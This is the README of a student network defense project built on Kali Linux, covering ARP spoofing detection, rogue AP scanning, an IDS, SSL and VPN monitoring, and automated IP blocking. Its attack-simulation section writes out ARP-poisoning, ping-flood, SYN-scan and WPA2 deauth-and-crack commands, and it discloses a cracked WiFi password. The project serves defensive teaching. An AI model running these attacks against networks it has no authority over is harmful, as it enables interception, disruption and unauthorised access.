
# 🛡️ NetDefend — Network Security Attack & Defense System

[![Python](https://img.shields.io/badge/Python-3.x-blue.svg)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-red.svg)](https://kali.org)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)]()

> A comprehensive network security system built on Kali Linux that combines 
> real-world attack simulation with intelligent defense mechanisms, 
> all monitored through a unified real-time dashboard.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Modules](#modules)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
- [Dashboard](#dashboard)
- [Attack Simulation](#attack-simulation)
- [Project Structure](#project-structure)
- [Libraries](#libraries)
- [Results](#results)
- [References](#references)
- [Author](#author)

---

## 🔍 Overview

NetDefend is a full-stack network security platform developed as part of a 
Computer Science project at VIT Chennai. It demonstrates a complete 
attack-and-defense lifecycle on a real network environment using a 
Kali Linux virtual machine.

Unlike existing security tools that solve one problem in isolation, 
NetDefend uniquely integrates:

- **Offensive** — Real WiFi attacks, ARP spoofing, packet injection
- **Defensive** — 10 protection modules running simultaneously  
- **Responsive** — Automated threat detection and IP blocking
- **Visual** — Unified real-time dashboard for all modules

The system was validated on a real campus network at VIT Chennai, 
detecting 63 WiFi networks, 304 ARP alerts, and a hidden rogue AP 
on Channel 132.

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    NETDEFEND SYSTEM                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│   WiFi (wlan0)              Wired (eth0)                │
│        │                        │                        │
│        ▼                        ▼                        │
│  ┌───────────┐          ┌───────────────┐               │
│  │ Module 3  │          │   Module 1    │               │
│  │ Rogue AP  │          │ ARP Detection │               │
│  └───────────┘          └───────────────┘               │
│                                 │                        │
│                         ┌───────────────┐               │
│                         │   Module 8    │               │
│                         │     IDS       │               │
│                         └───────────────┘               │
│                                 │                        │
│                         ┌───────────────┐               │
│                         │   Module 10   │               │
│                         │   Incident    │               │
│                         │   Response    │               │
│                         └───────────────┘               │
│                                 │                        │
│              ┌──────────────────┘                        │
│              ▼                                           │
│   ┌─────────────────────┐                               │
│   │     Module 9        │                               │
│   │  Unified Dashboard  │ ← http://127.0.0.1:5000       │
│   └─────────────────────┘                               │
└─────────────────────────────────────────────────────────┘
```

---

## 📦 Modules

### Phase 1 — WiFi Attack Suite

| Module | Description | Status |
|--------|-------------|--------|
| Phase 1 | WPA2 Handshake Capture & Cracking | ✅ Complete |

**Tools used:** `airodump-ng`, `aireplay-ng`, `aircrack-ng`

**Attack chain:**
```
airodump-ng scan → targeted capture → deauth attack → 
handshake captured → aircrack-ng dictionary crack → 
password cracked: orba2894
```

---

### Phase 2 — Defense Modules

#### Module 1 — ARP Spoofing Detection
```
Path    : ~/network_defense/module1_arp_detection/
Script  : arp_detector_final.py
Database: arp_monitor.db
```
- Monitors all ARP packets on eth0 using Scapy
- Maintains IP→MAC mapping table in SQLite
- Detects MAC address changes in real time
- Monitors gateway MAC separately
- Saves alerts to database for dashboard
- **Results:** 304 MAC_CHANGE alerts detected

---

#### Module 2 — Traffic Anomaly Detection
```
Path    : ~/network_defense/module2_traffic_anomaly/
Script  : traffic_anomaly_final.py
Database: traffic_anomaly.db
```
- Captures all IP packets on eth0
- Detects TTL anomalies (baseline deviation > 10)
- Detects duplicate packets
- Identifies OS spoofing via TTL changes
- **Results:** 27 anomalies detected (7 TTL, 20 duplicate)

---

#### Module 3 — Rogue Access Point Detection
```
Path     : ~/network_defense/module3_rogue_ap/
Script   : rogue_ap_final.py
Interface: wlan0 (monitor mode)
Output   : rogue_ap.json
```
- Scans all 32 channels (2.4GHz + 5GHz)
- Detects open networks, evil twins, hidden SSIDs
- Detects WEP encryption and channel spoofing
- Auto-restarts on socket crash
- Whitelisted SSIDs: VITC-HOS2-4, VITC-HOS2-5, eduroam
- **Results:** 63 networks found, 1 hidden TP-Link AP on CH132

**Detection Rules:**
```
Rule 1 — OPEN_NETWORK     : Unencrypted WiFi
Rule 2 — EVIL_TWIN_OPEN   : Trusted SSID broadcasting open
Rule 3 — HIDDEN_SSID      : Hidden network detected
Rule 4 — WEAK_ENCRYPTION  : WEP encryption detected
Rule 5 — EVIL_TWIN        : Duplicate SSID from different BSSID
Rule 6 — CHANNEL_SPOOF    : AP changed channel by > 5
```

---

#### Module 4 — Automated ARP Cache Hardening
```
Path  : ~/network_defense/module4_arp_hardening/
Script: arp_hardening_final.py
```
- Locks gateway and critical IPs as PERMANENT ARP entries
- Prevents ARP cache poisoning at OS level
- Checks every 5 seconds and re-locks if tampered
- Uses `ip neigh` commands

---

#### Module 5 — HTTPS Enforcement & SSL Monitoring
```
Path   : ~/network_defense/module5_https_enforcement/
Script : ssl_monitor_final.py
Output : cert_baseline.json
```
- Monitors SSL certificates for 4 domains
- Checks expiry, HTTPS redirect, HSTS headers
- Detects certificate changes (possible MITM)
- Saves baseline for comparison
- **Results:**
  - github.com  → 84 days, Grade A ✅
  - google.com  → 47 days, Grade A ✅
  - facebook.com → 7 days, Grade B ⚠️
  - wikipedia.org → 57 days, Grade A ✅

---

#### Module 6 — Certificate Pinning Validator
```
Path   : ~/network_defense/module6_cert_pinning/
Script : cert_pinning_final.py
Output : trusted_pins.json, pin_validation_log.json
```
- Saves SHA256 fingerprint of each domain certificate
- Compares live certificate to saved pin on every check
- Detects certificate rotation and MITM attacks
- Saves pin history when mismatch detected
- **Results:** facebook.com PIN MISMATCH detected (legitimate rotation)

---

#### Module 7 — VPN Protection Layer
```
Path   : ~/network_defense/module7_vpn_protection/
Script : vpn_monitor_final.py
Output : vpn_monitor_log.json
```
- Monitors WireGuard VPN interface (wg0)
- Detects DNS leaks
- Activates kill switch when VPN drops
- Blocks all non-VPN traffic via iptables
- Dashboard shows live VPN status

---

#### Module 8 — Custom Intrusion Detection System
```
Path   : ~/network_defense/module8_ids/
Script : ids_final.py
Output : ids_alerts.json
```
- Custom IDS built with Scapy (Snort unavailable)
- Monitors eth0 for 5 attack patterns

**Detection Rules:**
```
Rule 1 — ARP_SPOOFING  : MAC change detected     → HIGH
Rule 2 — PORT_SCAN     : 10+ SYN in 5 seconds    → MEDIUM
Rule 3 — ICMP_FLOOD    : 20+ pings in 5 seconds  → MEDIUM
Rule 4 — DNS_SPOOFING  : IP changed for domain   → HIGH
Rule 5 — SSL_STRIP     : Password in HTTP traffic → HIGH
```

---

#### Module 9 — Unified Security Dashboard
```
Path      : ~/network_defense/module9_dashboard/
Script    : dashboard.py
Templates : templates/dashboard.html
URL       : http://127.0.0.1:5000
```
- Flask-based real-time web dashboard
- Displays data from all 10 modules simultaneously
- Features:
  - Live stats bar (alerts, blocked IPs, SSL status)
  - Attack timeline graph (smooth line chart)
  - Alert feed with HIGH/MEDIUM/LOW severity
  - Device discovery table
  - SSL certificate panel
  - VPN status panel
  - Module status indicators
  - Block/Unblock IP controls
  - Kill switch toggle
  - Attack simulation buttons
  - Export report

**API Endpoints:**
```
GET /api/alerts          → All alerts from all modules
GET /api/stats           → System statistics
GET /api/devices         → Discovered devices
GET /api/blocked_ips     → Currently blocked IPs
GET /api/ssl             → SSL certificate status
GET /api/vpn             → VPN status
GET /api/timeline        → 24h attack timeline data
GET /api/wifi_networks   → Detected WiFi networks
GET /api/module_status   → Status of all 10 modules
GET /api/block/<ip>      → Block an IP
GET /api/unblock/<ip>    → Unblock an IP
GET /api/killswitch/enable  → Enable VPN kill switch
GET /api/killswitch/disable → Disable VPN kill switch
```

---

#### Module 10 — Automated Incident Response
```
Path   : ~/network_defense/module10_incident_response/
Script : response_engine.py
Output : incident_log.json, blocked_ips.json
```
- Reads alerts from Module 1 (ARP DB) and Module 8 (IDS JSON)
- Automatically blocks attacker IPs via iptables
- HIGH alert → block immediately
- MEDIUM alert × 5 → block after threshold
- Auto-unblock after 120 seconds
- Logs all actions to incident_log.json

---

## 💻 Requirements

### Hardware
- PC/Laptop with VMware Workstation
- Realtek USB WiFi adapter (supports monitor mode)

### Software
```
Kali Linux (VMware VM)
Python 3.x
VMware Workstation Player/Pro
```

### Python Libraries
```bash
pip install scapy flask
```

### System Tools
```
aircrack-ng suite  (airodump-ng, aireplay-ng, aircrack-ng)
arpspoof           (dsniff package)
nmap
iptables
iw
```

---

## 🚀 Installation

```bash
# Clone the repository
git clone https://github.com/YOUR_USERNAME/network-defense-system.git

# Navigate to project
cd network-defense-system

# Install Python dependencies
pip install scapy flask

# Install system tools
sudo apt install dsniff nmap aircrack-ng -y
```

---

## ▶️ Usage

### Start All Modules

**Terminal 1 — Dashboard:**
```bash
cd module9_dashboard
sudo python3 dashboard.py
```

**Terminal 2 — ARP Detector:**
```bash
cd module1_arp_detection
sudo python3 arp_detector_final.py
```

**Terminal 3 — IDS:**
```bash
cd module8_ids
sudo python3 ids_final.py
```

**Terminal 4 — Incident Response:**
```bash
cd module10_incident_response
sudo python3 response_engine.py
```

**Terminal 5 — SSL Monitor:**
```bash
cd module5_https_enforcement
sudo python3 ssl_monitor_final.py
```

**Terminal 6 — Certificate Pinning:**
```bash
cd module6_cert_pinning
sudo python3 cert_pinning_final.py
```

**Terminal 7 — VPN Monitor:**
```bash
cd module7_vpn_protection
sudo python3 vpn_monitor_final.py
```

**Terminal 8 — Rogue AP (requires USB WiFi):**
```bash
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
sudo dhclient eth0
cd module3_rogue_ap
sudo python3 rogue_ap_final.py
```

---

## 🌐 Dashboard

Open browser and navigate to:
```
http://127.0.0.1:5000
```

### Dashboard Panels

| Panel | Description |
|-------|-------------|
| Stats Bar | Total alerts, blocked IPs, SSL status, VPN status |
| Attack Timeline | 24h smooth line graph with HIGH/MEDIUM/LOW lines |
| Security Alerts | Live feed from all modules with severity |
| Device Table | All discovered network devices |
| SSL Monitor | Certificate grades and expiry for 4 domains |
| VPN Status | Live VPN up/down indicator |
| Module Status | Green/red status for all 10 modules |
| Blocked IPs | Currently blocked IPs with unblock option |
| Kill Switch | Enable/disable VPN kill switch |
| Attack Panel | Simulate attacks from dashboard |

---

## ⚔️ Attack Simulation

### ARP Spoofing
```bash
# Using arpspoof
sudo arpspoof -i eth0 -t 192.168.137.1 192.168.137.2

# Using Scapy (no target needed)
sudo python3 -c "
from scapy.all import *
while True:
    pkt = ARP(op=2, psrc='192.168.137.2', hwsrc='aa:bb:cc:dd:ee:ff',
              pdst='192.168.137.129', hwdst='00:0c:29:2a:41:81')
    sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/pkt, iface='eth0', verbose=0)
    time.sleep(2)
"
```

### ICMP Flood
```bash
sudo ping 192.168.137.2 -f -c 300
```

### Port Scan
```bash
sudo nmap -sS 192.168.137.2 --min-rate 1000 -p 1-100
```

### WPA2 Handshake Capture
```bash
# Scan for networks
sudo airodump-ng wlan0

# Target specific network
sudo airodump-ng -c 6 --bssid TARGET_BSSID -w capture wlan0

# Deauthentication attack
sudo aireplay-ng --deauth 10 -a TARGET_BSSID wlan0

# Crack handshake
sudo aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
```

---

## 📁 Project Structure

```
network_defense/
├── module1_arp_detection/
│   ├── arp_detector_final.py
│   └── arp_monitor.db
├── module2_traffic_anomaly/
│   ├── traffic_anomaly_final.py
│   └── traffic_anomaly.db
├── module3_rogue_ap/
│   ├── rogue_ap_final.py
│   └── rogue_ap.json
├── module4_arp_hardening/
│   └── arp_hardening_final.py
├── module5_https_enforcement/
│   ├── ssl_monitor_final.py
│   └── cert_baseline.json
├── module6_cert_pinning/
│   ├── cert_pinning_final.py
│   └── trusted_pins.json
├── module7_vpn_protection/
│   ├── vpn_monitor_final.py
│   └── vpn_monitor_log.json
├── module8_ids/
│   ├── ids_final.py
│   └── ids_alerts.json
├── module9_dashboard/
│   ├── dashboard.py
│   └── templates/
│       └── dashboard.html
├── module10_incident_response/
│   ├── response_engine.py
│   ├── incident_log.json
│   └── blocked_ips.json
├── phase1_wifi_attacks/
│   └── captures/
└── README.md
```

---

## 📚 Libraries

| Library | Purpose | Used In |
|---------|---------|---------|
| `scapy` | Packet capture and injection | Modules 1,2,3,8 |
| `flask` | Web dashboard server | Module 9 |
| `sqlite3` | Alert and device database | Modules 1,2,9 |
| `ssl` | Certificate validation | Modules 5,6 |
| `socket` | Network connections | Modules 5,6 |
| `hashlib` | SHA256 certificate pinning | Module 6 |
| `subprocess` | iptables, system commands | Modules 4,9,10 |
| `threading` | Parallel monitoring | Modules 1,3,9 |
| `json` | Alert storage and config | All modules |
| `datetime` | Timestamps and expiry | All modules |

---

## 📊 Results

| Metric | Value |
|--------|-------|
| WiFi networks detected | 63 |
| ARP alerts generated | 304 |
| IDS alerts generated | 5 rule types |
| SSL certificates monitored | 4 domains |
| PIN mismatches detected | 1 (facebook.com) |
| Hidden APs found | 1 (TP-Link CH132) |
| Auto-block response time | < 5 seconds |
| Dashboard refresh rate | 10 seconds |
| Channels scanned | 32 (2.4GHz + 5GHz) |
| WPA2 password cracked | orba2894 |

---


